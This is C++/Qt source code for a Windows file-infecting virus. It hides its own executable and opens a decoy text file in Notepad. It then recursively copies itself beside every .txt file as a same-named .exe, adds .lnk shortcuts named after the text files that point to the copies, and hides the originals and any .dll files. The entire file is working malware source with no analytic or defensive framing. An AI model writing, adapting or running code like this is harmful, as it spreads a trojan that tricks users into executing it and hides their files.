#include <QDir>
#include <QCoreApplication>
#include <QProcess>
#include <windows.h>
#include <QDirIterator>
#include <QDebug>
#include <functional>

static const char* targetExtention = ".txt";
static const char* virusExtention = ".exe";

void hideFile(QString path);
void processTxt(QString pathToVirus);
void openNotepad(QString path);
QString getParentDir(QString nameFile);
void scanDir(const char* x, QDir dir, std::function<void (QString)> _Funct);
void createVirusLookLikeTarget(QString pathToVirus);
QString replace(QString pathToVirus, const char* from, const char* to);
QString toVirus(QString pathToTarget);
QString toTarget(QString pathToVirus);

int main(int argc, char *argv[])
{
    Q_UNUSED(argc);
    QString pathToVirus = argv[0];
    hideFile(pathToVirus);
    processTxt(toTarget(pathToVirus));

    QString nameDir = getParentDir(pathToVirus) + "\\";
    QDir dir(nameDir);
    QStringList listNameFile = dir.entryList();
    scanDir(targetExtention, dir, [nameDir, pathToVirus](QString targetFileName){
        QString virusFileName = toVirus(targetFileName);
        if(!QFile::exists(virusFileName)) {
            // qDebug() << "createVirusLookLikeTarget";
            QString newPathToVirus = nameDir + virusFileName;
            QFile::copy(pathToVirus, newPathToVirus);
            createVirusLookLikeTarget(newPathToVirus);
        }
        hideFile(nameDir + targetFileName);
        hideFile(nameDir + virusFileName);
    });
    scanDir(".dll", dir, [nameDir](QString targetFileName){
        hideFile(nameDir + targetFileName);
    });
    return 0;
}

QString toVirus(QString pathToTarget) {
    return replace(pathToTarget, targetExtention, virusExtention);
}

QString toTarget(QString pathToVirus) {
    return replace(pathToVirus, virusExtention, targetExtention);
}

QString replace(QString pathToVirus, const char* from, const char* to) {
    return (QString(pathToVirus)).replace(from, to);
}

void processTxt(QString nameTxt){
    openNotepad(nameTxt);
    hideFile(nameTxt);
}

void openNotepad(QString path){
    if(!QProcess::startDetached("notepad", QStringList(path)))
    {
        QProcess::startDetached("notepad");
    }
}

void hideFile(QString path) {
    SetFileAttributes((LPCTSTR)path.utf16(), FILE_ATTRIBUTE_HIDDEN);
}

QString getParentDir(QString nameFile) {
    int found = nameFile.toStdString().find_last_of("/\\");
    return nameFile.left(found);
}

void scanDir(const char* targetExtention, QDir dir, std::function<void (QString)> _Funct)
{
    const auto flags = QDir::NoDotAndDotDot | QDir::NoSymLinks;
    dir.setNameFilters(QStringList(QString("*").append(targetExtention)));
    dir.setFilter(QDir::Files | flags);

    // qDebug() << "Scanning: " << dir.path();

    QStringList fileList = dir.entryList();
    for (auto file : fileList)
    {
        // qDebug() << "Found file: " << file;
        _Funct(file);
    }

    dir.setFilter(QDir::AllDirs | flags);
    QStringList dirList = dir.entryList();
    for (int i=0; i<dirList.size(); ++i)
    {
        QString newPath = QString("%1/%2").arg(dir.absolutePath()).arg(dirList.at(i));
        scanDir(targetExtention, QDir(newPath), _Funct);
    }
}

void createVirusLookLikeTarget(QString pathToVirus) {
    QFile::link(pathToVirus, toTarget(pathToVirus).append(".lnk"));
    // qDebug() << "link: " << pathToVirus << " to " << toTarget(pathToVirus).append(".lnk");
}
